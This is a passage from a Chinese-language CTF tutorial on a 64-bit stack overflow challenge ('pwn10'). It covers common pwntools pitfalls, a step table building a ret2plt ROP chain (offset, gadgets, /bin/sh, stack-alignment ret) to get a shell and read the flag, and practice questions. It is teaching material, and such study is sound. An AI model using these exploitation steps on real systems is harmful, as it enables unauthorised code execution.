| 5 | 用 `elf.symbols['system']` | 拿到的可能不是 PLT 跳板 | 用 `elf.plt['system']` |
| 6 | 直接 `sendline` 时偶尔时序不稳 | 一般也能打通，但可能和提示输出交错 | 想更稳可在 `sendline` 前加 `recvuntil(b"Input:")` |
| 7 | 远程没加 SSL | 连接被重置或收不到数据 | 平台要求时加 `ssl=True, sni=HOST` |
| 8 | 地址少写一位 | 跳到 `0x4006b` 之类的非法地址 | 地址按 8 字节写全，用 IDA/ROPgadget 复制 |

## 完整流程速查

| 步骤 | 目的 | 操作 | 结果 |
| --- | --- | --- | --- |
| 1 | 看类型 | `file ./pwn10` | 64 位、动态链接、not stripped |
| 2 | 看保护 | `checksec --file=pwn10` | No RELRO / No Canary / NX / No PIE |
| 3 | 找溢出 | IDA 看 `vulnerable_function` | `buf[128]`，`read` 读 `0x200` |
| 4 | 算偏移 | `buf` 在 `rbp-0x80` | `128 + 8 = 136` |
| 5 | 找 system | IDA / `elf.plt['system']` | `0x4004c0` |
| 6 | 找 gadget | ROPgadget | `pop rdi; ret = 0x4006b3`，`ret = 0x4004a1` |
| 7 | 找字符串 | ROPgadget `--string /bin/sh` | `0x600a90` |
| 8 | 画链 | 栈图 | padding → ret → pop rdi → /bin/sh → system |
| 9 | 对齐 | 进入 system 时 `rsp % 16 == 8` | 加一个 `ret` |
| 10 | 打远程 | `sendline(payload)` | shell；`cat /flag` 拿 flag |

## 小结

这道题其实就是把之前学过的几件事串起来：

- **64 位传参**：第一个参数放 `RDI`，所以要找 `pop rdi; ret`；
- **ret2plt**：程序里有 `system@plt`，不需要泄漏 libc 基址；
- **ROP**：用栈上的一串地址控制 `ret` 的跳转，把 gadget 拼成一条调用链；
- **栈对齐**：通过 `ret` 进入 `system` 时，要让它入口的 `rsp % 16 == 8`；不对就加一个普通 `ret`。

真正容易卡住的不是“怎么找 gadget”，而是最后那个**多出来的 ret**。地址全对、逻辑全对，但就是拿不到 shell，多半就是对齐问题。

最后留三个问题，你可以自己想一想：

1. 如果程序里没有 `pop rdi; ret`，你还能怎么把 `/bin/sh` 放进 `RDI`？
2. 如果 `/bin/sh` 不在程序里，而在 libc 里，你需要先泄漏什么？怎么泄漏？
3. 如果这题是 32 位，payload 会变成什么样？还需要那个额外的 `ret` 吗？

下一步可以试试：没有 `/bin/sh` 的 ret2libc、开了 PIE 的 ret2plt、或者带 Canary 的栈溢出。把“泄漏 → 算基址 → 再打”这条链接上，基本就入门了。
